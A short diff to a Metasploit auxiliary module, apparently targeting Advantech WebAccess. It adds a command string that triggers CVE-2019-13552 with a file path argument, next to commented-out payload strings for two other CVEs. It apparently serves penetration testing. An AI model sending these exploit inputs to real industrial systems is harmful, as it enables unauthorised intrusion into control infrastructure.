@@ -52,6 +52,7 @@ class MetasploitModule < Msf::Auxiliary
      command << NDR.long(0x2711)
      command << NDR.long(0x204)
      command << NDR.long(0x204)
+     command << "bwdlgpup 1 1 c:\\cat.txt" # CVE-2019-13552
      #command << "bwgetval c:\\hi.txt" # CVE-2019-13552 
      #command << "cnvlgxtag test,test,test,test,test,#{buff},test" # CVE-2019-13556
      #command << "bwdraw test test test test test #{buff}" # CVE-2018-14816 (AdvantechWebAccessUSANode8.2_20170817) 
